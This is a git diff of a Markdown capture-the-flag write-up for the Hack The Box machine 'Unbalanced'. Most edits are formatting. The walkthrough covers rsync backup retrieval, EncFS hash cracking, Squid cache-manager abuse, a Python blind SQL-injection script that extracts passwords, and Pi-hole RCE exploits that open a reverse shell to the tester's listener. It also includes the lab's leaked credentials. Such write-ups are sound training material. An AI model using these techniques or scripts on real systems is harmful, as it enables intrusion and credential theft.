@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/e6c79832f15361409f03e709d36777d8c033e13b/linux-machines/hard/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -10,20 +10,19 @@ Short description to include any strange things to be dealt with
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
 ### Nmap scan
 
-
 I started my enumeration with an nmap scan of `10.10.10.200`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ nmap -p- -sCV -n -v -oA unbalanced 10.10.10.200
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-13 20:15 EST
@@ -83,18 +82,17 @@ Nmap done: 1 IP address (1 host up) scanned in 55.27 seconds
 
 three ports open, 22-SSH, 873 - Rsync, and 3128 which was identfied as an HTTP Squid proxy
 
-https://en.wikipedia.org/wiki/Rsync
+[https://en.wikipedia.org/wiki/Rsync](https://en.wikipedia.org/wiki/Rsync)
 
+> rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times and sizes of files. It is commonly found on Unix-like operating systems. The rsync algorithm is a type of delta encoding, and is used for minimizing network usage. Zlib may be used for additional data compression, and SSH or stunnel can be used for security.
+>
+> Rsync is typically used for synchronizing files and directories between two different systems. For example, if the command rsync local-file user@remote-host:remote-file is run, rsync will use SSH to connect as user to remote-host. Once connected, it will invoke the remote host's rsync and then the two programs will determine what parts of the local file need to be transferred so that the remote file matches the local one.
+>
+> Rsync can also operate in a daemon mode \(rsyncd\), serving and receiving files in the native rsync protocol \(using the "rsync://" syntax\).
 
-> rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification times and sizes of files.  It is commonly found on Unix-like operating systems. The rsync algorithm is a type of delta encoding, and is used for minimizing network usage. Zlib may be used for additional data compression, and SSH or stunnel can be used for security.
+found an aritcle on pentesting port 873 - rsync - [https://book.hacktricks.xyz/pentesting/873-pentesting-rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)
 
-> Rsync is typically used for synchronizing files and directories between two different systems. For example, if the command rsync local-file user@remote-host:remote-file is run, rsync will use SSH to connect as user to remote-host.  Once connected, it will invoke the remote host's rsync and then the two programs will determine what parts of the local file need to be transferred so that the remote file matches the local one.
-
-> Rsync can also operate in a daemon mode (rsyncd), serving and receiving files in the native rsync protocol (using the "rsync://" syntax). 
-
-found an aritcle on pentesting port 873 - rsync - https://book.hacktricks.xyz/pentesting/873-pentesting-rsync
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ nc -vn 10.10.10.200 873
 (UNKNOWN) [10.10.10.200] 873 (rsync) open
@@ -107,7 +105,7 @@ conf_backups    EncFS-encrypted configuration backups
 
 apparently this machine has some backups enabled
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ rsync -av rsync://10.10.10.200:873/conf_backups ./conf_backups                                 1 ⨯
 receiving incremental file list
@@ -193,19 +191,19 @@ sent 1,452 bytes  received 411,990 bytes  35,951.48 bytes/sec
 total size is 405,603  speedup is 0.98
 ```
 
-I pulled the files to my machine using `rsync`.  
+I pulled the files to my machine using `rsync`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/conf_backups]
 └─$ ls -l | base64 -d > files
 base64: invalid input
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/conf_backups]
-└─$ cat .encfs6.xml 
+└─$ cat .encfs6.xml
 ```
 
-The files looked like base64 names at first, but then I realized that they were likely AES encrypted, and the `.encfs6.xml` showed this to be true.  
+The files looked like base64 names at first, but then I realized that they were likely AES encrypted, and the `.encfs6.xml` showed this to be true.
 
-```xml
+```markup
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE boost_serialization>
 <boost_serialization signature="serialization::archive" version="7">
@@ -247,26 +245,27 @@ mRdqbk2WwLMrrZ1P6z2OQlFl8QU=
 
 This XML file gave me all the information I needed to decrypt the files, except one thing...
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ encfs /home/zweilos/htb/unbalanced/conf_backups /home/zweilos/htb/unbalanced/decrypted         1 ⨯
 EncFS Password: 
 Error decoding volume key, password incorrect
 ```
-I installed `encfs` and attempted to decrypt the data, but I found out I needed a password.  While searching for how to crack the key from the .encfs6.xml file, I found https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml which led me to discover another "X2john" command that I didnt know: `encfs2john`.  
 
-```
+I installed `encfs` and attempted to decrypt the data, but I found out I needed a password. While searching for how to crack the key from the .encfs6.xml file, I found [https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml](https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml) which led me to discover another "X2john" command that I didnt know: `encfs2john`.
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ /usr/share/john/encfs2john.py conf_backups/.encfs6.xml > encfshash
 conf_backups/.encfs6.xml doesn't have .encfs6.xml!
-                                                                                                       
+
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ /usr/share/john/encfs2john.py conf_backups/ > encfshash
 ```
 
-I found that the `encfs2john` program must be run on a directory, rather than a single file by itself.  Using this script I was able to get a hash 
+I found that the `encfs2john` program must be run on a directory, rather than a single file by itself. Using this script I was able to get a hash
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt encfshash                                   127 ⨯
 Using default input encoding: UTF-8
@@ -280,20 +279,20 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-Using john I was able to quickly crack the hash and discovered the password was...`bubblegum`. 
+Using john I was able to quickly crack the hash and discovered the password was...`bubblegum`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ encfs /home/zweilos/htb/unbalanced/conf_backups /home/zweilos/htb/unbalanced/decrypted
-EncFS Password: 
+EncFS Password:
 ```
 
 I used the `encfs` program to extract the encrypted files from `conf_backups` to a folder.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ cd decrypted 
-                                                                                                       
+
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
 └─$ ls -la                   
 total 628
@@ -375,11 +374,11 @@ drwxr-xr-x 4 zweilos zweilos   4096 Nov 14 14:01 ..
 -rw-r--r-- 1 zweilos zweilos    642 Apr  4  2020 xattr.conf
 ```
 
-It turned out that this folder contained backups of all of the configuration files for the system.  There should be lots of juicy infomration here!
+It turned out that this folder contained backups of all of the configuration files for the system. There should be lots of juicy infomration here!
 
 squick-conf-acl.png
 
-```
+```text
 #Default:
 # Deny, unless rules exist in squid.conf.
 #
@@ -424,9 +423,10 @@ http_access allow intranet_net
 http_access deny all
 #http_access allow all
 ```
-squid conf block rules; found intranet.unbalanced.htb (added to hosts)
 
-```
+squid conf block rules; found intranet.unbalanced.htb \(added to hosts\)
+
+```text
 #  TAG: cachemgr_passwd
 #       Specify passwords for cachemgr operations.
 #
@@ -491,7 +491,7 @@ cachemgr_passwd disable all
 
 there was a password of `Thah$Sh1` which enabled a lot of the actions
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
 └─$ nikto -host 127.0.0.1 -useproxy http://10.10.10.200:3128                                     130 ⨯
 - Nikto v2.1.6
@@ -529,8 +529,7 @@ there was a password of `Thah$Sh1` which enabled a lot of the actions
 
 I ran nikto to see if there were any vulnerabilities, it reported a few different backdoors, but must have been showing false positives since none of these existed.
 
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
 └─$ curl -v -x http://10.10.10.200:3128 http://intranet.unbalanced.htb
 *   Trying 10.10.10.200:3128...
@@ -557,9 +556,9 @@ I ran nikto to see if there were any vulnerabilities, it reported a few differen
 * Connection #0 to host 10.10.10.200 left intact
 ```
 
-while trying to connect to `intranet.unbalanced.htb` I saw and added `intranet-host3.unbalanced.htb` to hosts, but was denied.  
+while trying to connect to `intranet.unbalanced.htb` I saw and added `intranet-host3.unbalanced.htb` to hosts, but was denied.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
 └─$ curl -v -x http://10.10.10.200:3128 http://intranet.unbalanced.htb/                       
 *   Trying 10.10.10.200:3128...
@@ -586,9 +585,9 @@ while trying to connect to `intranet.unbalanced.htb` I saw and added `intranet-h
 * Connection #0 to host 10.10.10.200 left intact
 ```
 
-noticed that this time the intranet host was was different: this time was `host2`.  After testing a few times I only got host 2 and 3.  
+noticed that this time the intranet host was was different: this time was `host2`. After testing a few times I only got host 2 and 3.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
 └─$ dirb http://intranet.unbalanced.htb /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -p 10.10.10.200:3128 -w
 
@@ -612,33 +611,33 @@ GENERATED WORDS: 62239
 END_TIME: Sat Nov 14 16:59:55 2020
 DOWNLOADED: 22562 - FOUND: 0
 ```
-only one directory found.  Tried again with files
 
+only one directory found. Tried again with files
 
+searched for a way to enumerate squid more -
 
-searched for a way to enumerate squid more - 
-* https://blog.ashiny.cloud/2018/04/28/squid-proxy-quickref/
-* http://etutorials.org/Server+Administration/Squid.+The+definitive+guide/Chapter+14.+Monitoring+Squid/14.2+The+Cache+Manager/
+* [https://blog.ashiny.cloud/2018/04/28/squid-proxy-quickref/](https://blog.ashiny.cloud/2018/04/28/squid-proxy-quickref/)
+* [http://etutorials.org/Server+Administration/Squid.+The+definitive+guide/Chapter+14.+Monitoring+Squid/14.2+The+Cache+Manager/](http://etutorials.org/Server+Administration/Squid.+The+definitive+guide/Chapter+14.+Monitoring+Squid/14.2+The+Cache+Manager/)
 
 > The squidclient utility is a simple HTTP client, with a few special features for use with Squid. For example, you can use a shortcut to request the cache manager pages. Rather than typing a long URL like this:
 
-```
+```text
 % squidclient cache_object://cache.host.name/info
 ```
 
 > you can use this shorter version:
 
-```
+```text
 % squidclient mgr:info
 ```
 
 looking back at the config page, the allowed methods for the squid manager were given:
 
-```
+```text
 cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
 ```
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ squidclient -h 10.10.10.200 -p 3128 http://intranet-host2.unbalanced.htb mgr:menu
 HTTP/1.1 401 Unauthorized
@@ -675,9 +674,9 @@ Connection: close
 ...snipped...
 ```
 
-I was on the right track, now I just needed to figure out how to authenticate with the password I had found.  The man page showed me that the `-w $password` would allow me to authenticate the proxy
+I was on the right track, now I just needed to figure out how to authenticate with the password I had found. The man page showed me that the `-w $password` would allow me to authenticate the proxy
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ squidclient -w 'Thah$Sh1' -h 10.10.10.200 -p 3128 http://intranet.unbalanced.htb mgr:menu
 HTTP/1.1 200 OK
@@ -746,9 +745,10 @@ Connection: close
  sourcehash             peer sourcehash information             disabled
  server_list            Peer Cache Statistics                   disabled
 ```
-`menu` got me a list of all of the info types I gould enumerate, though only a handful of them weren't disabled, and all of those were protected (required authentication)
 
-```
+`menu` got me a list of all of the info types I gould enumerate, though only a handful of them weren't disabled, and all of those were protected \(required authentication\)
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ squidclient -w 'Thah$Sh1' -h 10.10.10.200 -p 3128 http://intranet.unbalanced.htb mgr:pconn
 HTTP/1.1 200 OK
@@ -774,15 +774,15 @@ server-peers persistent connection counts:
          item 0:        172.17.0.1:80/intranet.unbalanced.htb
 ```
 
-it looked like intranet.unbalanced.htb resolved internally to a different address than I thought.  It was pointed towards `172.17.0.1`.
+it looked like intranet.unbalanced.htb resolved internally to a different address than I thought. It was pointed towards `172.17.0.1`.
 
 pic
 
-I put this address in my (proxied) browser, and it navigated to the same page!
+I put this address in my \(proxied\) browser, and it navigated to the same page!
 
 `mem` and `diskd` did not return anything useful, but `fqdncache` gave me some interesting internal information
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ squidclient -w 'Thah$Sh1' -h 10.10.10.200 -p 3128 http://intranet.unbalanced.htb mgr:fqdncache
 HTTP/1.1 200 OK
@@ -820,13 +820,13 @@ ff02::2                                         H -001   1 ip6-allrouters
 10.10.15.88                                    N  022   0
 ```
 
-There were the IPs for the intranet-host 2 and 3 I had seen earlier.  There didnt seem to be anything on `172.31.179.1` listed, so I tried it to see if it wasnt listed for some reason
+There were the IPs for the intranet-host 2 and 3 I had seen earlier. There didnt seem to be anything on `172.31.179.1` listed, so I tried it to see if it wasnt listed for some reason
 
 pic
 
-Taken out of load balancing, but not down?  I wondered if there was a way to load it to evaluate this "security maintenance" of theirs
+Taken out of load balancing, but not down? I wondered if there was a way to load it to evaluate this "security maintenance" of theirs
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ squidclient -w 'Thah$Sh1' -h 10.10.10.200 -p 3128 http://intranet.unbalanced.htb mgr:filedescriptors
 HTTP/1.1 200 OK
@@ -852,19 +852,19 @@ File Type   Tout Nread  * Nwrite * Remote Address        Description
   12 Socket    0       0        0  ::1:42500             pinger
 ```
 
-cache log at `/var/log/squid/cache.log` could be interesting.  There was not much interesting in the rest of the available methods
+cache log at `/var/log/squid/cache.log` could be interesting. There was not much interesting in the rest of the available methods
 
 pic
 
-Since each of the other hosts redirected requests for index.php to `intranet.php` I manually typed it in for host1 and it brought up the page.  Now I needed to find out what the page was taken down for 'security maintenance'. The page looked pretty much exactly like the others, so I figured the vulnerability must be in the input fields
+Since each of the other hosts redirected requests for index.php to `intranet.php` I manually typed it in for host1 and it brought up the page. Now I needed to find out what the page was taken down for 'security maintenance'. The page looked pretty much exactly like the others, so I figured the vulnerability must be in the input fields
 
 pic
 
- I entered a standard test for SQL injection `a ' or 'a' = 'a` in both the username and password field and my first try got a list of users. Only the username field was vulnerable to this
- 
-searched for how to use hydra with a proxy - https://forums.kali.org/showthread.php?18055-Hydra-using-Proxy
+I entered a standard test for SQL injection `a ' or 'a' = 'a` in both the username and password field and my first try got a list of users. Only the username field was vulnerable to this
 
-https://stackoverflow.com/questions/517127/how-do-i-write-output-in-same-place-on-the-console
+searched for how to use hydra with a proxy - [https://forums.kali.org/showthread.php?18055-Hydra-using-Proxy](https://forums.kali.org/showthread.php?18055-Hydra-using-Proxy)
+
+[https://stackoverflow.com/questions/517127/how-do-i-write-output-in-same-place-on-the-console](https://stackoverflow.com/questions/517127/how-do-i-write-output-in-same-place-on-the-console)
 
 ```python
 import requests
@@ -880,19 +880,19 @@ userlist = ['rita','jim','bryan','sarah']
 def pass_brute(users):
     for user in users:
         print('\nGetting password for user: {0}'.format(user))
-        
+
         data = {'Username': '', 'Password': "' or Username='" + user + "' and substring(Password,0,1)='x"}
         request = requests.post(url, data=data, proxies={'http':proxy_url})
         req_len = len(request.text)
-        
+
         password = ''
         print('[+] Enumerating password: ', sep="", end="", flush=True)
-        
+
         #Will test for passwords up to length 24. Edit this range for longer passwords
         for i in range(1,24):
             found = False
             for char in string.printable:
-            
+
                 #Print each character cycling through each guess and stopping when selected
                 #can also be done with sys.stdout, for print() use end='\b' (backspace - for single characters only)
                 print('{0}'.format(char), end="\b", flush=True)
@@ -906,10 +906,10 @@ def pass_brute(users):
                     break
             if not found:
                break
-               
+
             print('{0}'.format(char), sep="", end="", flush=True)
             password += char
-            
+
         #print final password, stripping off the extra single quotes    
         print('\nUse credentials: {0}:{1}'.format(user,password).rstrip('\''))
 
@@ -918,7 +918,7 @@ pass_brute(userlist)
 
 For some reason sending the username in the username field caused my SQL injection to not work, however sending it as SQL parameter in the password field worked...strange, but I got it to work
 
-```
+```text
 ┌──(zweilos㉿kali)-[~]
 └─$ python3 pass_brute.py
 
@@ -939,7 +939,7 @@ Getting password for user: sarah
 Use credentials: sarah:sarah4evah
 ```
 
-For some reason I had to strip off extra `'` characters from the passwords.  I suppose the server was returning the same message for a '`' as it was for a valid character.  I could have done a check and removed tests for a single quote, but if the password contained that character I would have missed it, so I left them on and stripped them at the end.
+For some reason I had to strip off extra `'` characters from the passwords. I suppose the server was returning the same message for a '\`' as it was for a valid character. I could have done a check and removed tests for a single quote, but if the password contained that character I would have missed it, so I left them on and stripped them at the end.
 
 ## Initial Foothold
 
@@ -948,7 +948,8 @@ For some reason I had to strip off extra `'` characters from the passwords.  I s
 ### Further enumeration
 
 ### Finding user creds
-```
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
 └─$ ssh bryan@10.10.10.200                                                                         2 ⨯
 The authenticity of host '10.10.10.200 (10.10.10.200)' can't be established.
@@ -972,10 +973,9 @@ unbalanced
 
 Using `bryan`'s password, I was able to login using SSH
 
-
 ### User.txt
 
-```
+```text
 bryan@unbalanced:~$ ls -la
 total 32
 drwxr-xr-x 3 bryan bryan 4096 Jun 17 11:35 .
@@ -997,7 +997,7 @@ Luckily, this was also the user with the flag!
 
 ### Enumeration as `bryan`
 
-```
+```text
 bryan@unbalanced:~$ cat TODO
 ############
 # Intranet #
@@ -1022,7 +1022,7 @@ bryan@unbalanced:~$ cat TODO
 - Expose Pi-hole ports to the network [TODO]
 ```
 
-```
+```text
 bryan@unbalanced:~$ sudo -l
 
 We trust you have received the usual lecture from the local System
@@ -1035,9 +1035,10 @@ Administrator. It usually boils down to these three things:
 [sudo] password for bryan: 
 Sorry, user bryan may not run sudo on unbalanced.
 ```
+
 Unfortunately `bryan` was not able to run commands using sudo
 
-```
+```text
 bryan@unbalanced:/etc$ ss -lnpt
 State        Recv-Q       Send-Q              Local Address:Port               Peer Address:Port       
 LISTEN       0            32                        0.0.0.0:53                      0.0.0.0:*          
@@ -1051,17 +1052,16 @@ LISTEN       0            128                             *:3128                
 LISTEN       0            5                            [::]:873                        [::]:*
 ```
 
-`ss -lntp`  showed a couple of ports open internally that were not visible externally
+`ss -lntp` showed a couple of ports open internally that were not visible externally
 
-```
+```text
 bryan@unbalanced:/etc$ curl http://127.0.0.1:8080
 [ERROR]: Unable to parse results from <i>queryads.php</i>: <code>Unhandled error message (<code>Invalid domain!</code>)</code>
-
 ```
 
-both of the ports gave an error while connecting.  Port 5553 simply hung, taking my session with it
+both of the ports gave an error while connecting. Port 5553 simply hung, taking my session with it
 
-```
+```text
 bryan@unbalanced:/etc$ cat /etc/hosts
 127.0.0.1       localhost
 127.0.1.1       unbalanced.htb  unbalanced
@@ -1079,7 +1079,7 @@ ff02::2 ip6-allrouters
 
 the hosts file did not show anything that I hadn't already enumerated through squid
 
-```
+```text
 bryan@unbalanced:~$ ip a
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -1122,9 +1122,10 @@ bryan@unbalanced:~$ ip a
     inet6 fe80::f814:ddff:fe73:ccf5/64 scope link 
        valid_lft forever preferred_lft forever
 ```
+
 Found the IP for the docker container mentioned in the TODO
 
-```
+```text
 bryan@unbalanced:~$ ssh 172.17.0.1
 The authenticity of host '172.17.0.1 (172.17.0.1)' can't be established.
 ECDSA key fingerprint is SHA256:aiHhPmnhyt434Qvr9CpJRZOmU7m1R1LI29c11na1obY.
@@ -1142,9 +1143,10 @@ permitted by applicable law.
 Last login: Sat Nov 14 18:46:33 2020 from 10.10.15.88
 bryan@unbalanced:~$
 ```
+
 was able to login to the container with Bryans creds
 
-```
+```text
 bryan@unbalanced:~$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -1182,7 +1184,7 @@ pic
 
 inside dnsmasq.conf there was a listen address of 172.31.0.1 - this was the same address I saw for the docker container earlier
 
-```
+```text
 bryan@unbalanced:/etc$ ip route
 default via 10.10.10.2 dev ens160 onlink 
 10.10.10.0/24 dev ens160 proto kernel scope link src 10.10.10.200 
@@ -1202,7 +1204,7 @@ fe80::250:56ff:feb9:f34f dev ens160 lladdr 00:50:56:b9:f3:4f router STALE
 
 checking locally cached routes and neighbors gave a new IP I hadnt seen before `172.31.11.3`
 
-```
+```text
 bryan@unbalanced:/etc$ nc 172.31.11.3 5553
 (UNKNOWN) [172.31.11.3] 5553 (?) : Connection refused
 bryan@unbalanced:/etc$ nc 172.31.11.3 8080
@@ -1223,27 +1225,28 @@ pic
 
 navigated to 172.31.11.3, foudn a pihole page, clicked on the link to the admin page and found a new vhost at pihole.unbalanced.htb
 
-```
+```text
 Pi-hole Version v4.3.2 Web Interface Version v4.3 FTL Version v4.3.1
 ```
 
-I searched for releases for pi-hole and found that the newest version was 5.1.  After that I searched for exploits for 4.3.2 and found a remote command execution vulnerability had been discovered https://frichetten.com/blog/cve-2020-11108-pihole-rce/ and a metasploit module https://www.exploit-db.com/exploits/48491
+I searched for releases for pi-hole and found that the newest version was 5.1. After that I searched for exploits for 4.3.2 and found a remote command execution vulnerability had been discovered [https://frichetten.com/blog/cve-2020-11108-pihole-rce/](https://frichetten.com/blog/cve-2020-11108-pihole-rce/) and a metasploit module [https://www.exploit-db.com/exploits/48491](https://www.exploit-db.com/exploits/48491)
 
-Needed a password in order to log into the setting page, 
+Needed a password in order to log into the setting page,
 
-https://hub.docker.com/r/pihole/pihole - tried to find it in the docker logs, but couldnt find the docker-compose.yml
+[https://hub.docker.com/r/pihole/pihole](https://hub.docker.com/r/pihole/pihole) - tried to find it in the docker logs, but couldnt find the docker-compose.yml
 
-```
+```text
 bryan@unbalanced:/etc$ docker logs pihole | grep WEBPASSWORD
 Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.40/containers/pihole/json: dial unix /var/run/docker.sock: connect: permission denied
 ```
+
 Also did not have pernissions to read the docker logs
 
-pic 
+pic
 
-tried logging in with admin...and got in! (Should have tried that first!). I noticed that the service was running with root privileges
+tried logging in with admin...and got in! \(Should have tried that first!\). I noticed that the service was running with root privileges
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ nc -lvnp 8099                                                                                   1 ⨯
 listening on [any] 8099 ...
@@ -1261,11 +1264,11 @@ test
 ^C
 ```
 
-The first part of the exploit seemed to work, but after the refresh I couldnt get it to display `.domain`.  Perhaps it wasnt vulnerable to this?
+The first part of the exploit seemed to work, but after the refresh I couldnt get it to display `.domain`. Perhaps it wasnt vulnerable to this?
 
-https://github.com/frichetten/CVE-2020-11108-PoC
+[https://github.com/frichetten/CVE-2020-11108-PoC](https://github.com/frichetten/CVE-2020-11108-PoC)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ sudo python3 ./root-cve-2020-11108-rce.py prdbr29htat9e3p10o7c7le7h1 http://127.0.0.1 10.10.15.88 12345     
 [+] Put Root Stager Success
@@ -1279,9 +1282,9 @@ https://github.com/frichetten/CVE-2020-11108-PoC
 [+] Triggering Exploit
 ```
 
-running the POC with all of the proper inputs stil did not work. I went looking for another exploit and found https://github.com/AndreyRainchik/CVE-2020-8816
+running the POC with all of the proper inputs stil did not work. I went looking for another exploit and found [https://github.com/AndreyRainchik/CVE-2020-8816](https://github.com/AndreyRainchik/CVE-2020-8816)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/unbalanced]
 └─$ python3 ./CVE-2020-8816.py http://127.0.0.1:1337 admin 10.10.15.88 12345                        2 ⨯
 Attempting to verify if Pi-hole version is vulnerable
@@ -1292,8 +1295,10 @@ Attempting to read $PATH
 Pihole is vulnerable and served's $PATH allows PHP
 Sending payload
 ```
+
 the payload was away...
-```
+
+```text
 ┌──(zweilos㉿kali)-[~]
 └─$ nc -lvnp 12345       
 listening on [any] 12345 ...
@@ -1302,14 +1307,14 @@ connect to [10.10.15.88] from (UNKNOWN) [10.10.10.200] 40152
 /bin/sh: 0: can't access tty; job control turned off
 $ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
 and I got a shell...as `www-data`.
 
-I was 
-
+I was
 
 ### Getting a shell
 
-```
+```text
 ┌──(zweilos㉿kali)-[~]
 └─$ nc -lvnp 12345       
 listening on [any] 12345 ...
@@ -1318,15 +1323,17 @@ connect to [10.10.15.88] from (UNKNOWN) [10.10.10.200] 40152
 /bin/sh: 0: can't access tty; job control turned off
 $ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-and I got a shell...as `www-data`.  I was in a pretty limited shell.  I had no TTY, and some commands would not work (I couldnt even upgrade my shell using python!). I figured I must be in the pihole docker
 
-```
+and I got a shell...as `www-data`. I was in a pretty limited shell. I had no TTY, and some commands would not work \(I couldnt even upgrade my shell using python!\). I figured I must be in the pihole docker
+
+```text
 $ uname -a
 Linux pihole.unbalanced.htb 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
 ```
+
 uname -a pointed to this as well
 
-```
+```text
 + sed -i /local-service/d /etc/dnsmasq.d/01-pihole.conf
 + [[ '' == \a\l\l ]]
 + [[ '' == \l\o\c\a\l ]]
@@ -1349,11 +1356,11 @@ uname -a pointed to this as well
 ++ LIGHTTPD_ENABLED=true
 + [[ '' == \t\r\u\e ]]
 + [[ -f /etc/dnsmasq.d/02-pihole-dhcp.conf ]]
-
 ```
+
 in the filesystem root `/` there was a file `pihole-install.log` which contained a hash of the webpassword
 
-```
+```text
 $ cd /root
 $ ls -la
 total 132
@@ -1368,8 +1375,7 @@ lrwxrwxrwx 1 root root      9 Apr  4  2020 .bash_history -> /dev/null
 
 After poking around for awhile I realized that I had access to the `/root` folder.
 
-```
-
+```text
     # Copy the temp log file into final log location for storage
     copy_to_install_log
 
@@ -1385,10 +1391,9 @@ After poking around for awhile I realized that I had access to the `/root` folde
             echo "WEBPASSWORD=$(HashPassword ${pw})" >> ${setupVars}
         fi
     fi
-
 ```
 
-In the ph_install.sh I found the instructions for creating the WEBPASSWORD
+In the ph\_install.sh I found the instructions for creating the WEBPASSWORD
 
 ```bash
 $ cat pihole_config.sh
@@ -1414,9 +1419,9 @@ $ cat pihole_config.sh
 /usr/local/bin/pihole -a email admin@unbalanced.htb
 ```
 
-The pihole_config.sh script contained another bubblegum-flavored password.
+The pihole\_config.sh script contained another bubblegum-flavored password.
 
-```
+```text
 $ su root
 su: must be run from a terminal
 ```
@@ -1425,7 +1430,7 @@ I was not able to use `su` from this limited shell, so I tried it from my SSH te
 
 ### Root.txt
 
-```
+```text
 bryan@unbalanced:~$ su root
 Password: 
 root@unbalanced:/home/bryan# cat /root/root.txt 
@@ -1435,8 +1440,9 @@ uid=0(root) gid=0(root) groups=0(root)
 unbalanced
 ```
 
-Finally! 
+Finally!
 
-Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) & [`GibParadox`](https://app.hackthebox.eu/users/125033) for... [something interesting or useful about this machine.]
+Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) & [`GibParadox`](https://app.hackthebox.eu/users/125033) for... \[something interesting or useful about this machine.\]
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
